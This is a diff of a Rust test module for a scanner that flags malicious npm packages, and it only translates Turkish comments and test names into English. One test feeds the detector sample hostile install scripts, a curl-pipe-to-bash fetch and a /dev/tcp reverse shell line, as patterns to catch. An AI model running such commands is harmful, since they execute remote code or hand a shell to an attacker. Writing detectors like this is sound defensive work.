     }
@@ -777,7 +790,7 @@ impl NpmReport {
 mod tests {
     use super::*;
 
-    /// Test bitince silinen geçici dizin (`Drop` ile).
+    /// Temporary directory removed when the test ends (via `Drop`).
     struct TempDir(PathBuf);
 
     impl TempDir {
@@ -788,7 +801,7 @@ mod tests {
             Self(dir)
         }
 
-        /// `relative` altına bir paket yazar.
+        /// Writes a package under `relative`.
         fn package(&self, relative: &str, manifest: Value) -> PathBuf {
             let dir = self.0.join(relative);
             std::fs::create_dir_all(&dir).unwrap();
@@ -808,28 +821,28 @@ mod tests {
     }
 
     #[test]
-    fn bilinen_surum_eslesir_temiz_surum_eslesmez() {
+    fn known_version_matches_clean_version_does_not() {
         assert!(known_incident("chalk", "5.6.1").is_some());
         assert!(known_incident("chalk", "5.6.2").is_none());
         assert!(known_incident("chalk", "5.6.10").is_none());
-        // Sürüm listesi boş olan paketler her sürümde zararlıdır.
+        // Packages with an empty version list are malicious at every version.
         assert!(known_incident("flatmap-stream", "0.1.0").is_some());
         assert!(known_incident("express", "4.18.2").is_none());
     }
 
     #[test]
-    fn bilinen_listesi_tutarli() {
+    fn known_list_is_consistent() {
         for (index, incident) in KNOWN.iter().enumerate() {
             assert!(
                 KNOWN[..index].iter().all(|other| other.name != incident.name),
-                "{} listede iki kez var",
+                "{} appears twice in the list",
                 incident.name
             );
         }
     }
 
     #[test]
-    fn olagan_kurulum_betikleri_supheli_degil() {
+    fn ordinary_install_scripts_are_not_suspicious() {
         for script in [
             "node install.js",
             "node-gyp rebuild",
@@ -844,7 +857,7 @@ mod tests {
     }
 
     #[test]
-    fn zararli_betik_kaliplari_yakalanir() {
+    fn malicious_script_patterns_are_caught() {
         for script in [
             "curl -s https://example.com/x.sh | bash",
             "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
@@ -859,10 +872,10 @@ mod tests {
     }
 
     #[test]
-    fn tarama_ic_ice_ve_kapsamli_paketleri_bulur() {
+    fn scan_finds_nested_and_scoped_packages() {
         let temp = TempDir::new("nested");
         temp.package("node_modules/express", pkg("express", "4.18.2"));
-        // Başka bir paketin altına gömülü zararlı sürüm.
+        // A malicious version nested under another package.
         temp.package("node_modules/express/node_modules/debug", pkg("debug", "4.4.2"));
         temp.package("node_modules/@ctrl/tinycolor", pkg("@ctrl/tinycolor", "4.1.1"));
         temp.package("node_modules/.pnpm/chalk@5.6.1/node_modules/chalk", pkg("chalk", "5.6.1"));
@@ -877,7 +890,7 @@ mod tests {
     }
 
     #[test]
-    fn ayni_bulgu_tek_satirda_toplanir() {
+    fn same_finding_is_collapsed_into_one_row() {
         let temp = TempDir::new("dedup");
         for project in ["a", "b", "c", "d"] {
             temp.package(&format!("{project}/node_modules/debug"), pkg("debug", "4.4.2"));
@@ -892,7 +905,7 @@ mod tests {
     }
 
     #[test]
-    fn iz_dosyasi_ve_betik_bulgulari() {
+    fn ioc_file_and_script_findings() {
         let temp = TempDir::new("ioc");
         let worm = temp.package(
             "node_modules/innocent",
@@ -906,25 +919,25 @@ mod tests {
 
         let scan = scan(&[temp.0.join("node_modules")]);
         let kinds: Vec<Kind> = scan.findings.iter().map(|finding| finding.kind).collect();
-        // `test` betiği kurulumda çalışmaz; yalnızca `preinstall` sayılır.
+        // The `test` script does not run on install; only `preinstall` counts.
         assert_eq!(kinds, [Kind::IocFile, Kind::Script]);
     }
 
     #[test]
-    fn bozuk_ve_adsiz_manifestler_atlanir() {
+    fn skips_broken_and_unnamed_manifests() {
         let temp = TempDir::new("broken");
         let broken = temp.0.join("node_modules/broken");
         std::fs::create_dir_all(&broken).unwrap();
-        std::fs::write(broken.join("package.json"), "{ bozuk").unwrap();
+        std::fs::write(broken.join("package.json"), "{ broken").unwrap();
         temp.package("node_modules/helper", serde_json::json!({ "type": "module" }));
 
-        let scan = scan(&[temp.0.join("node_modules"), temp.0.join("yok")]);
+        let scan = scan(&[temp.0.join("node_modules"), temp.0.join("missing")]);
         assert_eq!(scan.packages, 0);
         assert!(scan.findings.is_empty());
     }
 
     #[test]
-    fn proje_aramasi_gizli_dizinleri_ve_ic_node_modules_atlar() {
+    fn project_search_skips_hidden_dirs_and_nested_node_modules() {
         let temp = TempDir::new("walk");
         temp.package("app/node_modules/a/node_modules/b", pkg("b", "1.0.0"));
         temp.package(".cache/node_modules/c", pkg("c", "1.0.0"));
@@ -933,32 +946,32 @@ mod tests {
         let found = find_node_modules(&temp.0, &["Library"]);
         assert_eq!(found, [temp.0.join("app/node_modules")]);
 
-        // Yolun kendisi node_modules ise olduğu gibi kullanılır.
+        // If the path itself is a node_modules it is used as is.
         let direct = temp.0.join("app/node_modules");
         assert_eq!(roots_under(&direct), [direct.clone()]);
     }
 
     #[test]
-    fn desen_acilimi() {
+    fn pattern_expansion() {
         let temp = TempDir::new("expand");
         std::fs::create_dir_all(temp.0.join("node/v20/lib")).unwrap();
         std::fs::create_dir_all(temp.0.join("node/v22/lib")).unwrap();
 
         let paths = expand(&temp.0, "node/*/lib");
         assert_eq!(paths, [temp.0.join("node/v20/lib"), temp.0.join("node/v22/lib")]);
-        assert!(expand(&temp.0, "yok/*/lib").is_empty());
+        assert!(expand(&temp.0, "missing/*/lib").is_empty());
     }
 
     #[test]
-    fn osv_yaniti_yalnizca_mal_kayitlarini_alir() {
-        let a = ("temiz".to_string(), "1.0.0".to_string());
-        let b = ("zararli".to_string(), "2.0.0".to_string());
-        let c = ("acikli".to_string(), "3.0.0".to_string());
+    fn osv_response_keeps_only_mal_records() {
+        let a = ("clean".to_string(), "1.0.0".to_string());
+        let b = ("malicious".to_string(), "2.0.0".to_string());
+        let c = ("vulnerable".to_string(), "3.0.0".to_string());
         let packages = [&a, &b, &c];
 
         let request: Value = serde_json::from_str(&osv_request(&packages)).unwrap();
         assert_eq!(request["queries"][1]["package"]["ecosystem"], "npm");
-        assert_eq!(request["queries"][1]["package"]["name"], "zararli");
+        assert_eq!(request["queries"][1]["package"]["name"], "malicious");
         assert_eq!(request["queries"][1]["version"], "2.0.0");
 
         let response = r#"{"results":[
@@ -970,7 +983,7 @@ mod tests {
         assert_eq!(
             hits,
             [OsvHit {
-                package: "zararli".into(),
+                package: "malicious".into(),
                 version: "2.0.0".into(),
                 ids: vec!["MAL-2025-1".into()],
             }]
@@ -981,7 +994,7 @@ mod tests {
     }
 
     #[test]
-    fn osv_bulgusu_gomulu_listeyi_yinelemez() {
+    fn osv_finding_does_not_duplicate_embedded_list() {
         let temp = TempDir::new("osv");
         temp.package("node_modules/debug", pkg("debug", "4.4.2"));
         let mut scan = scan(&[temp.0.join("node_modules")]);
@@ -991,13 +1004,13 @@ mod tests {
             version: "4.4.2".into(),
             ids: vec!["MAL-1".into()],
         };
-        scan.add_osv(vec![hit("debug"), hit("yeni-zararli")]);
+        scan.add_osv(vec![hit("debug"), hit("new-malicious")]);
 
         let kinds: Vec<(Kind, &str)> = scan
             .findings
             .iter()
             .map(|finding| (finding.kind, finding.package.as_str()))
             .collect();
-        assert_eq!(kinds, [(Kind::Known, "debug"), (Kind::Osv, "yeni-zararli")]);
+        assert_eq!(kinds, [(Kind::Known, "debug"), (Kind::Osv, "new-malicious")]);
     }
 }
